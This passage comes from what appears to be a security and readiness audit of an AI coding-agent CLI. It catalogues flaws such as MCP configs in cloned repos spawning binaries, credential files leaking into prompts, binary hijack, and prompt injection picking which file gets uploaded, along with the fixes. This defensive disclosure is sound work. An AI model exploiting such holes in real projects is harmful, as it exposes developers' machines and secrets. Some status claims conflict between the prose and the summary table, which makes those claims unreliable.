consumes them**. Grep across the package returns only `chain.mjs` itself and
`test/smoke.test.mjs`. `runSession` calls the chain with `model: config.model`
(`lib/turn.mjs`), never reads `reply.model`, and returns `model: config.model`
 into both the human cost line and the `--json` document
(`lib/report.mjs`).

⭐ **The fix is one line, not a design change.** `lib/model.mjs` already returns the
candidate that was called and `callChain` (`lib/chain.mjs`) spreads it — so `reply.model`
*already holds* the answering model inside `runSession`. The return object simply prefers
`config.model` over the value sitting in scope.

⚠️ **Re-checked 2026-08-11: still open, and the audit log makes it visible rather than
fixing it.** The new audit record has the right *shape* —
`"model":{"requested":…,"answered":…,"chain":[…]}` — and on a real, successful,
no-fallback run it wrote:

```json
"model":{"requested":"deepseek/deepseek-v4-flash-0731","answered":null,"chain":[]}
```

`answered: null`, because nothing upstream ever populates it. That is the honest shape
(a null is not a lie, where repeating the requested id would be), and it is also the
clearest possible statement that the one-line fix has not been made. A compliance artifact
with a permanently-null "which model answered" field is a field you will be asked about.

Four precisions that change how you should weight it:

- The substitution is **not unconditional**: the chain advances only when `isRetryable`
  says so (`lib/chain.mjs`) — 429, 5xx, transport, empty-200. A 400/401/403/404
  returns at `:137` with `usedFallback: false` and never tries a second model.
  `MAX_ATTEMPTS = 4` bounds it to three substitutes.
- On *total* failure the error string does list every model tried. The
  dishonesty is specific to the **success** path — which is the worse half, since that is
  the run that produces files and a receipt.
- Every candidate goes through the same endpoint and key (`lib/model.mjs`), so
  this is not an unannounced second vendor relationship.
- ⚠️ **But it is broader than fallback.** `lib/model.mjs` sets the returned `model` from
  the *request* parameter, never from the response body — so even with zero fallbacks the
  reported id does not identify which OpenRouter sub-provider served the call.

**Media, same bucket:** `transcribe` base64s and POSTs **any** workspace file with no size
cap and no extension check (`lib/media.mjs`), while its sibling `speak` *does* cap
its input at 5,000 characters — a cap was written for one and omitted from the
other. `--dry-run` does not gate the POST in `seePage` (`:139` vs `:150`), `makeDocument`
(`:220` vs `:224`) or `transcribe` (which takes no `dryRun` at all, and is called
without one at `lib/tools.mjs`).

⚠️ And a real bug the security framing walks past: the CLI sends `{ audioB64: b64 }`
(`lib/media.mjs`) but our worker reads `item.get("audio_b64")`
(`gpu/modal/transcribe.py:108`) and rejects with `"supply audio_url or audio_b64"`.
`console/lib/transcribe.ts:116` sends the correct key. **CLI `transcribe` currently pays
the egress cost and returns nothing.** The author handled exactly this camel/snake split
on the *response* side (`lib/media.mjs`) and never checked the request side.

⭐ For the record, because it is the opposite of a gap: this is **not** an
unauthenticated exfiltration channel. `gpu/modal/transcribe.py:101-105` fails shut —
`if not expected or item.get("secret") != expected: return unauthorised`, commented *"A
missing secret must fail shut, never open."* The destination is
`MODAL_TRANSCRIBE_URL` from the operator's own environment (`lib/media.mjs`); a prompt
injection chooses *which* file, never *where it goes*.

### 3.7 ✅ FIXED — the README's credential clause is scoped

It said the agent "cannot see your credentials", unscoped, where the code comment it
summarises is precisely scoped to reading API keys out of `process.env`. It now reads
"cannot see your credentials **in its environment**", followed by a paragraph naming what
the scrub does not reach: `~/.aws/credentials`, `~/.ssh/id_rsa`, `~/.config/gh/hosts.yml`,
and any variable `SECRET_NAME` misses. Three words plus a paragraph. Closed.

### 3.8 The documented defaults did not match the code, in both documents

**Found 2026-08-11 while auditing this file. Fixed in the docs; nothing to fix in code.**

`README.md` documented `--max-rounds` as 3 (it is **5**) and `--max-tokens` as 8000 (it is
**12000**). This document repeated the round number in §1.4 and §5.2. Both came from the
same trap: there are **two** constants named `DEFAULT_MAX_ROUNDS`, one in `lib/turn.mjs`
(value 3, the fallback for a library caller that omits the argument) and one in
`lib/cli-args.mjs` (value 5, what every CLI run gets). The docs cited the first and
described the second.

⭐ **Worth more than the correction: nothing in the package could catch it.** 455 tests
passed the whole time, because a test that reads the constant and a doc that states a
number never meet. `test/docs-truth.test.mjs` now parses the README's own options table
and asserts each documented default equals the exported constant — so the next time a
default moves, the suite goes red instead of the documentation going quietly wrong.

### Summary table

| # | gap | class | fix size | state |
|---|---|---|---|---|
| 3.1 | `.mcp.json` auto-spawn on an ordinary run, unscrubbed env, no consent | RCE from a cloned repo | done | ✅ **fixed 2026-08-12** — one-time consent per config fingerprint (`lib/mcp-consent.mjs`), trust store under `$HOME` and **never** in the workspace, fails closed with no terminal, and the binary is announced BEFORE the spawn. The audit's own repro (`evil.cjs` + committed `.mcp.json`, `--max-rounds 2`) no longer writes `PWNED.txt`. |
| 3.2 | Pre-load ships `.env`/`*.pem`/`id_rsa` to the provider | credential disclosure | done | ✅ **fixed, and it was fixed before this document said otherwise** — `gatherWorkspaceContext` runs every candidate through `refusedCommitPath`; re-measured and pinned by a test |
| 3.3 | `gh` resolved from cwd on Windows | binary hijack | done | ✅ **fixed 2026-08-12** — resolved through `resolveOnPath` to an absolute path (measured: `C:\Program Files\GitHub CLI\gh.EXE`), and the child now gets `scrubEnvironment(env)` instead of the API key |
| 3.4 | Write guard checks `segments[0]` only; `.github/` unlisted | supply chain | done | ✅ **fixed 2026-08-12** — every segment is checked, so `packages/web/node_modules/…` is refused. ⚠️ `.github/` `.husky/` `.vscode/` deliberately **left writable**: they are tracked and appear in every diff, "add a CI workflow" is an ordinary request, and refusing correct work is the more expensive mistake. Reasoning in `workspace.mjs`; revisit as a policy setting, not by extending the set. |
| 3.5 | Outage exits 0 / `ok: true` (and can print `✔ VERIFIED`) | CI correctness | done | ✅ **fixed 2026-08-12** — `sessionFailed` now reads `stoppedBecause === 'model-error'`, the summary names the provider instead of blaming the model, and the parallel path uses the same verdict function (it had the identical hole) |
| 3.6 | Reported model ≠ answering model; media caps and `--dry-run` gates; `audioB64` key bug | audit + correctness | mostly | ✅ **model attribution FIXED** (re-measured: the audit record carries `"answered":…,"chain":[…]`). ✅ **`audioB64` FIXED** — it sends `audio_b64` now. ✅ **`transcribe` FIXED** — it took no `dryRun` at all and had no size or type check, so an unbounded upload of any workspace file was one wrong argument away; now capped at 25MB, restricted to audio/video extensions, and refused under `--dry-run`. ⚠️ **DELIBERATELY NOT CHANGED:** `seePage` / `speak` / `makeDocument` still POST under `--dry-run`. They have always used `dryRun` to mean "do not WRITE", `designPass` passes it straight through to render-and-critique, and 15+ tests encode that meaning — **redefining the flag underneath a shipped feature is a product decision, not a bug fix.** Roman's call; forcing it broke 13 tests protecting the design loop. |
| 3.7 | README credential clause unscoped | documentation | 5 min | ✅ **fixed** |
| 3.8 | Documented `--max-rounds`/`--max-tokens` defaults wrong in both docs | documentation | 15 min | ✅ **fixed**, and now guarded by a test |

Total for what remains: **one deliberate open question — whether `--dry-run` should stop a render POST (§3.6) — and nothing else in this table.** Every other row is closed and pinned by a test in `test/enterprise-gaps.test.mjs` — a gap closed without a test is a gap that reopens on the next refactor, which is how three of these stayed open for weeks after being written down.

⚠️ **One gap has been closed since the first draft that is not in this table, because it
was never a defect — it was missing product:** there is now an audit log (§2.2/4).

---

## 4. What to build first, and why

Reordered 2026-08-11 against what is actually still open. Two items from the first
draft's list are struck because they are done.

1. **§3.2 — stop shipping secrets in the prompt.** *One hour.* First because it is the
   only gap that discloses data on an ordinary, non-adversarial run — no hostile repo
   required, no Windows required — and because it is what a security reviewer finds
   first and cannot un-see. `NEVER_COMMIT` (`lib/git.mjs`) already exists; reuse it in
   `CONTEXT_SKIP` (`lib/turn.mjs`) and in the executor's `readFile`.
2. **§3.1 — add config-hash consent before the first MCP spawn.** *2 hours.* The flag
   gate is shut, so the remaining exposure is conditional on a hostile repo — but it is
   still the highest severity on the list, and it now fires on the *ordinary* path,
   which is the one everybody uses. Emit the audit event before `connectServer`, not
   after, so a spawn that never returns still leaves a record naming the binary.
3. **§3.3 — route `gh` through `resolveExecutable`.** *30 minutes.* Third only because
   it is Windows-and-configuration-scoped. The fix is copying a function this package
   already wrote (`resolveExecutable`, `lib/mcp.mjs`), so it is nearly free and there is
   no reason to defer it past the same commit block.
4. **§3.5 — make `sessionFailed` read `stoppedBecause`.** *30 minutes.* Now that the
   audit log records the cause, the exit code is the last place still telling the shell
   the wrong thing. This is the one that makes the product *usable* as a build step
   rather than merely safe, and it is the gap that breaks the promise the exit codes
   exist for.
5. **§3.4 — test every path segment, extend the set with `.github`, `.husky`,
   `.vscode`, `.devcontainer`.** *15 minutes.* Below §3.5 because it requires the model
   to be adversarial or badly wrong, whereas §3.5 fires on an ordinary rate limit.
6. **§3.6 — honest model attribution, media caps, the `audio_b64` key.** *~1 hour.*
   Correctness and truthfulness, not exposure. The audit log already has the
   `model.answered` field waiting for a value; populating it is one line and it turns a
   permanently-null compliance field into a real one.
7. **Then a consent/approval gate for `delete_file` and out-of-plan writes.** The
   remaining *new* control, and the one that makes unattended operation defensible.
8. **Then tamper-evidence for the audit log.** It is currently written into the workspace
   by the same process that edits the workspace, which makes it evidence rather than
   proof. Append-only hashing or an out-of-workspace destination is the next honest step,
   and it should be sold as that step rather than implied today.

~~**An audit log.**~~ ✅ **Done** — it was item 7 on the first draft's list and the first
genuinely new enterprise control on it. `.acuvo/audit/<date>.jsonl`, redacted, bounded,
opt-out-able. See §2.2/4 for a real record and for the two things it still does not do.

~~**§3.7 — the README credential clause.**~~ ✅ Done.

⚠️ **What is deliberately *not* on this list:** an endpoint override, SSO, entitlements,
metering. Each is a real enterprise requirement (§2.2, items 6 and 8) and none of them is
a defect — they are unbuilt product, and building them before the defects above would be
shipping features on top of a list we have already written down.

---

## 5. Where we lose to Claude Code, Cursor and Copilot today

No spin. If any of these five is decisive for you, buy theirs.

### 5.1 ⚠️ Your tests probably do not run at all

`ALLOWED_BINARIES` is `node`, `npm`, `npx`, `tsc` (`lib/command.mjs`). A Python, Go,
Rust, Java, Ruby or .NET shop **cannot execute a single test** with this tool. The
run-and-fix loop — the thing that produces the 5/7 → 7/7 improvement — degrades to
"writes files and cannot check them".

This is structural, not an oversight: the whole safety argument in §2.1 is that the model
cannot pick a program. Every language we add is a new binary and a new argument grammar
to validate. Claude Code, Cursor and Copilot run whatever your shell runs, and for a
polyglot enterprise that is not a small advantage — it is the deciding one.

### 5.2 Horizon — and delegation, which is no longer absent

Default **5** rounds, hard ceiling **16** (`DEFAULT_MAX_ROUNDS` and `MAX_ROUNDS_LIMIT`,
`lib/cli-args.mjs` — this document previously said 3, then 8, see §3.8). The cap is a
deliberate cost decision and it is *also* a real capability loss: a refactor that needs
forty tool rounds cannot be expressed here.

⚠️ **This section was headed "the absence of delegation" and said "we have neither
sub-agents nor task delegation". Both halves are now false.** `delegate` ships
(`runSubagent` / `subagentToolSchemas`, `lib/subagent.mjs`; dispatched in `lib/tools.mjs`).
The honest description of what it is and is not:

- It is **read-only**. The helper is offered twelve tools, every one of them a read
  (`SUBAGENT_TOOL_NAMES`) — no write, no edit, no commit, no execution — and `allowRun:
  false` locks the dispatcher behind the offer, so `mutated: false` is a fact about the
  tool surface rather than a convention.
- It is **one level deep** (`MAX_SUBAGENT_DEPTH` = 1). A helper cannot delegate again. Two
  levels is how a five-round task becomes a hundred model calls nobody authorised.
- It is **capped at 6 rounds, 4 by default** (`MAX_SUBAGENT_ROUNDS`). A subagent must not
  outspend its parent; a researcher needing more than a handful of rounds is being asked
  the wrong question, and the honest answer is a worse summary rather than a bigger bill.
- It returns a **distilled summary**, ~900 characters, not the transcript — which is the
  point: the parent's context is the scarce resource, and the win is that fifteen file
  reads become three sentences.
- It **refuses rather than guessing** when no model credentials reached the dispatcher.

⭐ **The bug in it is worth stating too, because it is the class of bug this document keeps
finding.** The dispatcher passed `depth + 1`, so the top-level `delegate` refused *itself*
with "a helper cannot delegate again (depth 1)". All thirteen unit tests passed — every one
of them called `runSubagent` directly and none came through the dispatcher. One real run
found it immediately. Built is not wired, and only the real path can tell you which you have.

What is still true: Claude Code's agentic loops go further than ours, and delegation here
buys *context* rather than *horizon* — a helper cannot do work, only find things out.
`--resume <id>` and `--continue` remain the manual horizon extension: a saved conversation
is rebuilt and carried on without re-paying for the workspace gather (measured, the second
turn of a resumed task cost 11,516 tokens against the first turn's 17,312).

### 5.3 Model quality on the hard cases

We default to `deepseek/deepseek-v4-flash-0731` (`DEFAULT_MODEL`, `lib/model.mjs`). On a gnarly
multi-file refactor with subtle type interactions, a frontier model in Claude Code
produces a better answer than ours, and no amount of loop engineering closes that. Our
$0.00067-per-task number is real and it is not an argument that the output is equivalent.

### 5.4 No editor, and no diff you approve before it lands

Cursor and Copilot live *inside* the editor: inline completion, hunk-level accept/reject,
a diff you read before it is written. We have no editor presence at all, and we write
first and report afterwards (`lib/report.mjs`). Our report is good — line counts,
replaced-char proportion, a warning when a file shrank by 40% (`rewriteWarnings`,
`lib/report.mjs`) — but it is a *post-mortem*, not a review gate.

### 5.5 Context reach

`gatherWorkspaceContext` (`lib/turn.mjs`) walks **two levels deep** with a bounded file
count and byte budget. Cursor indexes the whole repository. We have `find_files` and
`search_text` (`searchToolSchemas`, `lib/search.mjs`) which materially close the gap
inside the loop, but on a large monorepo the first round starts with far less than a
competitor's does.

### 5.6 The enterprise checklist we mostly do not have

GitHub Copilot ships SSO, org policy, audit logging, a data-retention agreement,
zero-data-retention endpoints and SOC 2.

⭐ **One of those is now ours: audit logging** (§2.2/4) — redacted, bounded, one line per
run, opt-out-able, and verified by running it. It is genuine, and it is one item.

⭐ **And one that was a blocker in the last draft is not any more: the repository is
public.** `github.com/xxiautomate-star/acuvo-code` is open and clonable — verified
2026-08-11 by cloning it into an empty directory and running the CLI out of the result. A
stranger evaluating this document can now obtain the software it describes, which the
previous draft correctly said they could not.

Still absent: **no published npm package** (the registry returns 404 for both `acuvo-code`
and `acuvo`), and zero users.

⭐ **The single-file bundle is no longer absent, and this paragraph said it was.** It read
"`scripts/bundle.mjs` was never written, so the command exits 1 and its 44 tests skip".
Measured 2026-08-13: `npm run bundle` completes in **1.0s** and emits **1,829,742 bytes
across 61 modules**, which then runs `--version` and `--help` from a directory with no
source tree on the path. For an evaluator that is the shortest supply chain available —
one file, no registry, no install, nothing transitive to audit.

⚠️ Kept as a correction rather than a silent edit, because this document's own §5.7 is
about exactly this failure mode, and a stale *pessimistic* claim is not the safe direction
to err in: it tells a buyer we cannot do something we can.

If your procurement process starts with a questionnaire, we will fail it today.

### 5.7 ⚠️ And the one this document itself demonstrated

The claims in a document drift from the code faster than anyone believes. Two default
values in the README were wrong; a headline claim in §1.5 was disproved by a free plugin;
"18 shipped files" became 41; and thirty-four `file:line` citations rotted in under a
week — while 455 tests passed continuously, because no test in the package could see any
of it. Competitors with a documentation team and a release process have a control here
that we replaced with one test file (`test/docs-truth.test.mjs`) and a rule that citations
name symbols, not lines. Treat that as mitigation, not as parity.

### What we do not lose

For completeness, the properties none of them offers:

- ⭐ **It looks at what it built and returns a verdict, not a picture** (`seePage` /
  `findingsFrom`, `lib/media.mjs`) — 89 tokens against a screenshot's 3,072, and it
  abstains rather than guessing. ⚠️ Not "nobody else can see": they can, one install away.
  The edge is the return value, and it is a head start rather than a moat.
- ⭐ **It produces PDF, PPTX, PNG, speech and transcripts** from the same loop
  (`lib/media.mjs`), and generates imagery with no configuration and no account
  (`lib/imagegen.mjs`) — critiqued before it is accepted, and reported as unreviewed when
  no critic is available.
- ⭐ **Zero dependencies.** The entire auditable surface is 74 files and 41,621 lines,
  and there is no `node_modules` behind it. (Counted 2026-08-13 from
  `lib/*.mjs` + `bin/*.mjs`; `test/docs-truth.test.mjs` fails the build if this number
  drifts, which is why it went 18 → 41 → 46 → 52 → 53 → 57 → 60 → 61 → 62 → 65 → 66 → 69 → 70 → 71 → 72 → 73 as modules landed. ⭐ A
  count that fails the build is the only kind that stays true — this one has now caught its own
  staleness six times, most recently the moment `acceptance-consent.mjs` shipped.
  ⚠️⚠️ AND IT WAS WRONG ANYWAY, BY TWO, FOR A DAY. The guard asserted only that the
  correct number appeared *somewhere* in this file, and `68` did — inside the unrelated
  citation `lib/command.mjs:68` on line 9. A build-failing count matched a line number
  and passed while the sentence above it said 66. The check is now anchored to the
  word it is counting, because a guard that can be satisfied by a coincidence is not a
  guard, it is a decoration that everyone trusts.
  ⚠️ **And the check is weaker than it reads:** it asserts the document *contains the
  digits*, so a coincidental "53" anywhere passes it. Verified by mutation — replacing
  this figure with the historical 41 left the suite green. Treat it as a reminder, not a
  guarantee.)
- ⭐ **36 tools, and a `--doctor` that tells you which of them are actually live here**
  (`TOOL_NAMES`, `lib/tools.mjs`; `lib/doctor.mjs`). It needs no API key and no network,
  exits 0 only when nothing is broken, and every dark or broken line names the exact
  environment variable that fixes it — including `MODAL_VIDEO_SECRET`, whose absence made
  four working media tools look broken for an hour because a correctly-set URL *without*
  it answers HTTP 200 with `{ok:false,error:"unauthorised"}`.
- ⭐ **The exit code is a verdict**, with `ran` and `passed` kept separate everywhere
  (`toJson`, `lib/report.mjs`; `sessionFailed`, `lib/turn.mjs`) — modulo §3.5, which is on
  the defect list precisely because we hold ourselves to it.

---

*Questions on any claim here should be answerable by opening the cited line. If one is
not, that is a defect in this document and we want to hear about it.*
